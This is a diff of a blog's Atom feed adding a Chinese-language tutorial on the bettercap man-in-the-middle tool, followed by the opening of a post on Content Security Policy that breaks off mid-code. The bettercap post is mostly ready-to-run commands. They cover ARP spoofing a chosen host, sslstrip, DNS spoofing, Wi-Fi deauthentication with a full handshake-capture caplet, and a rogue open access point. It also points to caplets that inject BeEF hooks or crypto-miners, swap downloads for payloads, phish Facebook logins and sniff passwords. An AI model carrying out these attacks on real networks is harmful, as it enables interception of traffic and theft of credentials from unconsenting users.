@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://myt0.com/"/>
-  <updated>2018-08-04T16:07:45.327Z</updated>
+  <updated>2019-03-01T08:05:42.806Z</updated>
   <id>http://myt0.com/</id>
   
   <author>
@@ -14,6 +14,196 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>中间人工具bettercap</title>
+    <link href="http://myt0.com/2019/03/01/%E4%B8%AD%E9%97%B4%E4%BA%BA%E5%B7%A5%E5%85%B7bettercap/"/>
+    <id>http://myt0.com/2019/03/01/中间人工具bettercap/</id>
+    <published>2019-03-01T07:52:51.000Z</published>
+    <updated>2019-03-01T08:05:42.806Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>bettercap 用于中间人攻击测试，并可以应用于 wifi 网络的一些测试。</p>
+<p>官网：<a href="https://www.bettercap.org/" target="_blank" rel="external">https://www.bettercap.org/</a></p>
+<p>项目地址：<a href="https://github.com/bettercap/bettercap" target="_blank" rel="external">https://github.com/bettercap/bettercap</a></p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>官网介绍的安装命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ go get github.com/bettercap/bettercap</span><br><span class="line">$ <span class="built_in">cd</span> <span class="variable">$GOPATH</span>/src/github.com/bettercap/bettercap</span><br><span class="line">$ make build &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure>
+<p>因为我用的 parrot 中默认自带了，所以我没有尝试过安装，如果 kali 中没有这一工具，貌似也可以 apt install 直接安装，如果不能就按照官网介绍的安装命令来吧。</p>
+<h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>bettercap 有两种用法：</p>
+<ol>
+<li>直接执行会进入交互式模式</li>
+<li>非交互模式，命令<code>-caplet 文件</code>执行脚本文件，通过编写脚本可以组合复杂的攻击，或者<code>-eval 命令</code>直接执行命令内容。</li>
+</ol>
+<p><code>-h</code>输出帮助信息。</p>
+<p><code>-iface 网卡</code>指定网卡对应的网络，比如 wlan0。</p>
+<h3 id="内网发现"><a href="#内网发现" class="headerlink" title="内网发现"></a>内网发现</h3><p>进入交互模式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo bettercap -iface eth1</span><br></pre></td></tr></table></figure>
+<p>展示网络情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.show</span><br></pre></td></tr></table></figure>
+<p>执行过后会展示被动发现的网络主机，但有些需要主动发现，使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.probe on</span><br></pre></td></tr></table></figure>
+<p>启用主动发现之后会产生一系列数据包探测网络，接着重复<code>net.show</code>会看到新发现的网络主机。</p>
+<p><code>ticker on</code>为定时器模块，可以重复执行命令，默认执行的命令是<code>clear; net.show</code>，所以我们执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo bettercap -iface eth1 -eval &quot;net.probe on;ticker on&quot;</span><br></pre></td></tr></table></figure>
+<p>会开启内网探测，并重复刷新显示最新探测到的网络状况。</p>
+<p>交互式模式下使用以下命令修改 ticker 执行的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set ticker.commands &apos;command&apos;</span><br></pre></td></tr></table></figure>
+<p>设置执行 ping 检测是否连接到外网：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set ticker.commands &apos;clear; net.show; !ping -c 1 google.com &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo &quot;Connected&quot; || echo &quot;Not connected&quot;&apos;</span><br></pre></td></tr></table></figure>
+<p>设置执行间隔时间为 3 秒</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set ticker.period 3</span><br></pre></td></tr></table></figure>
+<p>开启定时器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ticker on</span><br></pre></td></tr></table></figure>
+<p>使用命令模式一步执行上面的所有内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo bettercap -eval &apos;net.probe on; set ticker.commands &quot;clear; net.show; !ping -c 1 google.com &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo &quot;Connected&quot; || echo &quot;Not connected&quot;&quot;; set ticker.period 3; ticker on&apos;</span><br></pre></td></tr></table></figure>
+<p>我们可以使用-caplet 参数，指定一个包含命令的 cap 文件来代替-eval，这样就不用每次都输入一大串命令。<br>新建一个 netmon.cap，内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net.probe on</span><br><span class="line"># Note the absence of quotes in this example and the quotes in the previous ones:</span><br><span class="line">set ticker.commands clear; net.show; !ping -c 1 google.com &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo &quot;Connected&quot; || echo &quot;Not connected&quot;</span><br><span class="line">set ticker.period 3</span><br><span class="line">ticker on</span><br></pre></td></tr></table></figure>
+<p>然后执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo better -caplet ./netmon.cap</span><br></pre></td></tr></table></figure>
+<h3 id="欺骗和嗅探"><a href="#欺骗和嗅探" class="headerlink" title="欺骗和嗅探"></a>欺骗和嗅探</h3><p>开启 ARP 欺骗：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp.spoof on</span><br></pre></td></tr></table></figure>
+<p>默认情况下，会对整个子网进行欺骗，所以通常我们要设置对应的 IP，而不是攻击所有主机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set arp.spoof.targets 192.168.66.3</span><br></pre></td></tr></table></figure>
+<p>要设置多个 IP 的话使用逗号间隔<br>接下来看看网络情况：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.show</span><br></pre></td></tr></table></figure>
+<p>在启动 ARP 欺骗之前一定要设置目标，如果要改变目标 IP，先停止欺骗:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp.spoof off</span><br><span class="line">set arp.spoof.targets 192.168.66.3</span><br><span class="line">arp.spoof on</span><br></pre></td></tr></table></figure>
+<p>对于嗅探来说，如果嫌结果冗余，可以先精简结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set net.sniff.verbose false</span><br></pre></td></tr></table></figure>
+<p>开启嗅探</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.sniff on</span><br></pre></td></tr></table></figure>
+<h3 id="HTTP-透明代理"><a href="#HTTP-透明代理" class="headerlink" title="HTTP 透明代理"></a>HTTP 透明代理</h3><p>要分析 HTTP 流量，必须开启 http.proxy。如果结合 sniff 模块，所有嗅探到的 HTTP 流量都会转到 http.proxy，这种情况下，它会自动设置端口转发。<br>如果你想使用 sslstrip，必须设置 http.proxy.sslstrip 为 true，默认为 false</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set http.proxy.sslstrip true</span><br></pre></td></tr></table></figure>
+<p>开启 http proxy:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.proxy on</span><br></pre></td></tr></table></figure>
+<p>下面以攻击 192.168.66.3 为例，首先开启 arp.spoof 让对方的所有流量转到攻击者的机器，然后开启 http.proxy，这样所有 http 流量转到代理模块，然后精简嗅探结果并开启嗅探，这样可以看到所有 sniff 到的重要信息。如果想看到 https，开启 http.proxy.sslstrip。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set http.proxy.sslstrip true</span><br><span class="line">set net.sniff.verbose false</span><br><span class="line">set arp.spoof.targets 192.168.66.3</span><br><span class="line">arp.spoof on</span><br><span class="line">http.proxy on</span><br><span class="line">net.sniff on</span><br></pre></td></tr></table></figure>
+<p>要攻击整个内网，省略 set arp.spoof.targets 这一句。</p>
+<h3 id="DNS-欺骗"><a href="#DNS-欺骗" class="headerlink" title="DNS 欺骗"></a>DNS 欺骗</h3><p>使用 dns.spoof 模块可以实现 DNS 欺骗，默认情况会欺骗目标所有访问的域名。如果要指定欺骗的域名，执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set dns.spoof.domains myt0.com,google.com</span><br></pre></td></tr></table></figure>
+<p>设置欺骗转向的地址，默认是本地地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set dns.spoof.address desired_IP</span><br></pre></td></tr></table></figure>
+<p>默认只会回应那些对本地的请求，如果要回应任何请求，使用以下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set dns.spoof.all true</span><br></pre></td></tr></table></figure>
+<p>运行 dns spoof:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns.spoof on</span><br></pre></td></tr></table></figure>
+<h3 id="内置-webserver"><a href="#内置-webserver" class="headerlink" title="内置 webserver"></a>内置 webserver</h3><p>你也可以使用自带的 apache：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start apache2</span><br></pre></td></tr></table></figure>
+<p>bettercap 内置一个简单的 web server, 首先设置 server 监听的目录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set http.server.path /path/folder</span><br></pre></td></tr></table></figure>
+<p>开启 http.server</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.server on</span><br></pre></td></tr></table></figure>
+<h3 id="Wi-Fi-网络监听："><a href="#Wi-Fi-网络监听：" class="headerlink" title="Wi-Fi 网络监听："></a>Wi-Fi 网络监听：</h3><p>首先使用-iface 指定监听 wifi 网卡：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo bettercap -iface wlan0</span><br></pre></td></tr></table></figure>
+<p>这个时候可能会出现报错：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Can&apos;t restore interface wlan0 wireless mode (SIOCSIWMODE failed: Bad file descriptor).</span><br><span class="line">Please adjust manually.</span><br></pre></td></tr></table></figure>
+<p>这是因为需要将网卡开启混杂模式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ip link set wlan0 down</span><br><span class="line">$ sudo iw wlan0 set monitor control</span><br><span class="line">$ sudo ip link set wlan0 up</span><br></pre></td></tr></table></figure>
+<p>然后指定网卡启动之后，开启探测 wifi 网络：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifi.recon on</span><br></pre></td></tr></table></figure>
+<p>执行之后会看到探测的所有 wifi 网络。<br>如果你觉得结果太多，可以设置监听指定的频道：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifi.recon.channel 1,2,3</span><br></pre></td></tr></table></figure>
+<p>如果之后想监听所有频道，执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifi.recon.channel clear</span><br></pre></td></tr></table></figure>
+<p>然后显示 wifi 探测结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifi.show</span><br></pre></td></tr></table></figure>
+<p>接下来我们利用 ticker 展示最新探测到的 20 个 wifi：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set ticker.commands &apos;clear; wifi.show; net.show; events.show 20&apos;</span><br><span class="line">wifi.recon on</span><br><span class="line">ticker on</span><br></pre></td></tr></table></figure>
+<h3 id="捕获握手数据包"><a href="#捕获握手数据包" class="headerlink" title="捕获握手数据包"></a>捕获握手数据包</h3><p>这里你需要理解当连接 wifi 的时候密码配对正确时会产生一个 handshake，里面包含 wifi 密码的密文，可以利用伪造的断网数据包使客户端与 AP（wifi 接入点）断开连接，然后客户端会自动重新连接，这个时候我们可能会捕获到 handshake。</p>
+<p>首先简化输出结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set net.sniff.verbose true</span><br></pre></td></tr></table></figure>
+<p>通过设置 handshake 的标志位过滤 handshake：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set net.sniff.filter ether proto 0x888e</span><br></pre></td></tr></table></figure>
+<p>设置数据包存放路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set net.sniff.output /root/wpa.pcap</span><br></pre></td></tr></table></figure>
+<p>开启嗅探：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.sniff on</span><br></pre></td></tr></table></figure>
+<p>设置 wifi 频道：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifi.recon.channel 3</span><br></pre></td></tr></table></figure>
+<p>开启 wifi 探测：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifi.recon on</span><br></pre></td></tr></table></figure>
+<p>如果你对某一 AP 感兴趣，可以指定其 BSSID：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifi.recon 50:46:5d:6e:8c:20</span><br></pre></td></tr></table></figure>
+<p>利用 ticker 显示最新发现的 wifi：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set ticker.commands &apos;clear; wifi.show&apos;</span><br><span class="line">ticker on</span><br></pre></td></tr></table></figure>
+<p>发动断网攻击，攻击指定的 AP 或者客户端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wifi.deauth AP-BSSID</span><br><span class="line">wifi.deauth CLIENT-BSSID</span><br></pre></td></tr></table></figure>
+<p>我们可以用下面的命令判断数据包中是否含有 handshake：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r /root/wpa.pcap -R &apos;eapol&apos; -2 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>更直观的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if [ &quot;`tshark -r /root/wpa.pcap -R &apos;eapol&apos; -2 2&gt;/dev/null`&quot; ]; then echo &quot;Got handshake!&quot;; else echo &quot;Nothing&quot;; fi;</span><br></pre></td></tr></table></figure>
+<p>接下来我们综合上述内容创建一个 cap 脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># Setting up the sniffer</span><br><span class="line">set net.sniff.verbose true</span><br><span class="line">set net.sniff.filter ether proto 0x888e</span><br><span class="line">set net.sniff.output /root/wpa.pcap</span><br><span class="line">net.sniff on</span><br><span class="line"></span><br><span class="line"># Configuring and starting the analysis of wireless networks; channel and BSSID replace with your values</span><br><span class="line">wifi.recon.channel 8</span><br><span class="line">wifi.recon on</span><br><span class="line">sleep 20</span><br><span class="line">wifi.recon 50:46:5d:6e:8c:20</span><br><span class="line"></span><br><span class="line"># Performing the deauthentication attack, sleeping for 60 seconds, checking if a handshake was captured,</span><br><span class="line"># if yes, then quitting bettercap.</span><br><span class="line"># Note that if you changed the name of the file where the handshake is saved, you also need to change</span><br><span class="line"># it here - /root/wpa.pcap, and also replace BSSID with the attacked AP</span><br><span class="line">set ticker.commands wifi.deauth 50:46:5d:6e:8c:20; sleep 60; !&apos;if [ &quot;`tshark -r /root/wpa.pcap -R &apos;eapol&apos; -2 2&gt;/dev/null`&quot; ]; then echo &quot;Got handshake! Quit.&quot;; sleep 1; pkill -1 bettercap; else echo &quot;Yet not captured&quot;; fi;&apos;</span><br><span class="line"># Period of the cycle - only one second is set here, because in the previous set of commands there is a sleep 60;</span><br><span class="line"># which sets the sleep for 60 seconds:</span><br><span class="line">set ticker.period 1</span><br><span class="line"># Run cyclic execution of commands</span><br><span class="line">ticker on</span><br></pre></td></tr></table></figure>
+<p>根据脚本运行 bettercap:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo bettercap -iface wlan0 -caplet ./HS_capture_50465d6e8c20.cap</span><br></pre></td></tr></table></figure>
+<h3 id="创建伪造-AP"><a href="#创建伪造-AP" class="headerlink" title="创建伪造 AP"></a>创建伪造 AP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set wifi.ap.ssid Banana</span><br><span class="line">set wifi.ap.bssid DE:AD:BE:EF:DE:AD</span><br><span class="line">set wifi.ap.channel 5</span><br><span class="line">set wifi.ap.encryption false</span><br><span class="line">wifi.recon on; wifi.ap</span><br></pre></td></tr></table></figure>
+<p>这里可以基于其他设置执行复杂的攻击，比如基于社会工程学的自动攻击。</p>
+<h3 id="bettercap-caplet-回顾"><a href="#bettercap-caplet-回顾" class="headerlink" title="bettercap caplet 回顾"></a>bettercap caplet 回顾</h3><p>官方自带了一些 cap 脚本，<a href="https://github.com/bettercap/caplets" target="_blank" rel="external">点击查看</a>。下面我们来看几个典型的脚本怎么使用。</p>
+<h4 id="Beef-hooking"><a href="#Beef-hooking" class="headerlink" title="Beef hooking"></a>Beef hooking</h4><p>Beef 通过与客户端的 JS 通信来控制受害者客户端，简单来说是一个 XSS 工具，不了解的可先去学习一下怎么使用 beef。<br>bettercap 提供的与 beef 相关的两个脚本是<a href="https://github.com/bettercap/caplets/blob/master/beef-passive.cap" target="_blank" rel="external">beef-passive.cap</a>， <a href="https://github.com/bettercap/caplets/blob/master/beef-active.cap" target="_blank" rel="external">beef-active.cap</a>，<br>第一个脚本被动注入 JS，第二个脚本主动注入 JS，这两个脚本都会注入<a href="https://github.com/bettercap/caplets/blob/master/beef-inject.js" target="_blank" rel="external">beef-inject.js</a>，查看源码会发现这个 js 文件网 HTML 中注入一个 JS 地址，你需要将这个 JS 地址替换为你的 Beef JS 地址。</p>
+<h3 id="矿机注入"><a href="#矿机注入" class="headerlink" title="矿机注入"></a>矿机注入</h3><p><a href="https://github.com/bettercap/caplets/blob/master/crypto-miner.cap" target="_blank" rel="external">crypto-miner.cap</a>会注入矿机，你需要修改<a href="https://github.com/bettercap/caplets/blob/master/crypto-miner.js" target="_blank" rel="external">crypto-miner.js</a>，写入你自己 key。</p>
+<h3 id="替换上传下载文件"><a href="#替换上传下载文件" class="headerlink" title="替换上传下载文件"></a>替换上传下载文件</h3><p><a href="https://github.com/bettercap/caplets/blob/master/download-autopwn.cap" target="_blank" rel="external">download-autopwn.cap</a>用于替换下载的文件，需要注意两点：</p>
+<ol>
+<li>受害者发出请求的 user-agent 字段需要匹配 downloadautopwn.useragent.x regexp 的值</li>
+<li>请求的文件扩展名要匹配 downloadautopwn.extensions.x，根据这些扩展名，你可以在 caplets/download-autopwn/找到对应的 downloadautopwn.devices。<br>同时<a href="https://github.com/bettercap/caplets/blob/master/download-autopwn.js" target="_blank" rel="external">download-autopwn.js</a>文件与 download-autopwn.cap 互相配合，这个脚本并不是用于浏览器的，而是用于 http.proxy 模块，控制 bettercap 的行为。<br>执行过后，如果有人上传文件，这边匹配到了就会替换成你对应的 payload。</li>
+</ol>
+<h3 id="窃取-Facebook-密码"><a href="#窃取-Facebook-密码" class="headerlink" title="窃取 Facebook 密码"></a>窃取 Facebook 密码</h3><p><a href="https://github.com/bettercap/caplets/blob/master/fb-phish.cap" target="_blank" rel="external">fb-phish.cap</a>会在 80 端口放置一个伪造的 facebook 登录页，利用了 http.proxy 模块，有人访问登录了，就会打印捕获的密码，然后重定向到真正的 facebook。<br>这一脚本利用<a href="https://github.com/bettercap/caplets/blob/master/fb-phish.js" target="_blank" rel="external">fb-phish.js</a>文件控制 http.proxy。<br>开始之前要创建一个伪造 login 页面，可以使用 makefile 快速创建：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd caplets/www/</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+<p>然后发起攻击：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set http.server.address 0.0.0.0</span><br><span class="line">set http.server.path caplets/www/www.facebook.com/</span><br><span class="line"></span><br><span class="line">set http.proxy.script caplets/fb-phish.js</span><br><span class="line"></span><br><span class="line">http.proxy on</span><br><span class="line">http.server on</span><br></pre></td></tr></table></figure>
+<h3 id="收集-HTTP-请求"><a href="#收集-HTTP-请求" class="headerlink" title="收集 HTTP 请求"></a>收集 HTTP 请求</h3><p>运行 ARP 欺骗，然后利用<a href="https://github.com/bettercap/caplets/blob/master/http-req-dump.js" target="_blank" rel="external">http-req-dumsp.js</a>来导出与 http.proxy 或者 https.proxy 交互的请求包。</p>
+<h3 id="收集-Form-框自动传入数据"><a href="#收集-Form-框自动传入数据" class="headerlink" title="收集 Form 框自动传入数据"></a>收集 Form 框自动传入数据</h3><p>假如浏览器记录了上次登录的 form 框用户名密码，下次打开会自动传入或者进行一些交互之后传入，在 form 框自动传入记录的信息时我们可以利用<a href="https://github.com/bettercap/caplets/blob/master/login-man-abuse.cap" target="_blank" rel="external">login-man-abuse.cap</a>来收集这些信息。<br>例子：<a href="https://miloserdov.org/?goto=28503" target="_blank" rel="external">webpage demo</a></p>
+<h3 id="利用-DHCPv6-请求重定向-DNS-请求"><a href="#利用-DHCPv6-请求重定向-DNS-请求" class="headerlink" title="利用 DHCPv6 请求重定向 DNS 请求"></a>利用 DHCPv6 请求重定向 DNS 请求</h3><p>原理介绍：<a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" target="_blank" rel="external">https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/</a></p>
+<p>大概意思是，现代版本中的 windows 系统对 ipv6 有优先权，攻击者发送一个指定攻击者 IP 为 DNS server 的 ipv6 数据包给 windows 受害者，会起到 DNS 欺骗的效果。</p>
+<p>利用脚本<a href="https://github.com/bettercap/caplets/blob/master/mitm6.cap" target="_blank" rel="external">mitm6.cap</a>。</p>
+<h3 id="http-proxy-测试脚本"><a href="#http-proxy-测试脚本" class="headerlink" title="http.proxy 测试脚本"></a>http.proxy 测试脚本</h3><p><a href="https://github.com/bettercap/caplets/blob/master/proxy-script-test.cap" target="_blank" rel="external">proxy-script-test.cap</a>帮助你测试 js 脚本的运行，这里利用<a href="https://github.com/bettercap/caplets/blob/master/proxy-script-test.js" target="_blank" rel="external">proxy-script-test.js</a>。</p>
+<h3 id="密码嗅探"><a href="#密码嗅探" class="headerlink" title="密码嗅探"></a>密码嗅探</h3><p><a href="https://github.com/bettercap/caplets/blob/master/simple-passwords-sniffer.cap" target="_blank" rel="external">simple-passwords-sniffer.cap</a>利用简单的正则来截取密码。</p>
+<h3 id="自定义-bettercap-交互提示"><a href="#自定义-bettercap-交互提示" class="headerlink" title="自定义 bettercap 交互提示"></a>自定义 bettercap 交互提示</h3><p><a href="https://github.com/bettercap/caplets/blob/master/test-prompt-stats.cap" target="_blank" rel="external">test-prompt-stats.cap</a></p>
+<h3 id="改变-web-页面内容"><a href="#改变-web-页面内容" class="headerlink" title="改变 web 页面内容"></a>改变 web 页面内容</h3><p><a href="https://github.com/bettercap/caplets/blob/master/web-override.cap" target="_blank" rel="external">web-override.cap</a>可以改变为任何攻击者指定页面。利用<a href="https://github.com/bettercap/caplets/blob/master/web-override.js" target="_blank" rel="external">web-override.js</a>脚本控制 http.proxy。<br>如果你想的话，你可以创造自己的 caplet，然后提交到官方的仓库。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如你所见，bettercap 是一款强大的，非常容易实现各种中间人攻击的工具。<br>以上只是介绍了一部分用法，在实际中还需要自己多加探索。在官方文档有记载所有模块的作用。<br>本文参考自 <a href="https://miloserdov.org/?p=1112" target="_blank" rel="external">https://miloserdov.org/?p=1112</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;bettercap 用于中间人攻击测试，并可以应用于 wifi 网络的一些测试。&lt;/p&gt;
+&lt;p&gt;官网：&lt;a href=&quot;https://ww
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>内容安全策略</title>
+    <link href="http://myt0.com/2018/08/09/CSP/"/>
+    <id>http://myt0.com/2018/08/09/CSP/</id>
+    <published>2018-08-08T23:47:00.000Z</published>
+    <updated>2018-08-11T16:03:05.328Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>内容安全策略(Content Security Policy)可以控制浏览器信任以何种方式、何种来源去加载资源，用于削弱 XSS 的危害，也可以防止使用HTTP时被注入恶意代码，通过服务器返回 Content-Security-Policy 来告诉浏览器具体的策略，因此需要浏览器支持。<br>另外meta元素也可以设置:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; img-src https://*; child-src 'none';"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里可以看到，CSP 是通过规定可信域，来限制脚本或者其他静态资源的执行。</p>
+<h3 id="常见字段"><a href="#常见字段" class="headerlink" title="常见字段"></a>常见字段</h3><p>字段之间通过分号相隔，字段值可以使用通配符，多个值以空格相隔。<br>self 代表本站</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 允许所有内容来源于本站及myt0.com子域名</span></span><br><span class="line">default-src <span class="string">'self'</span> *.myt0.com</span><br><span 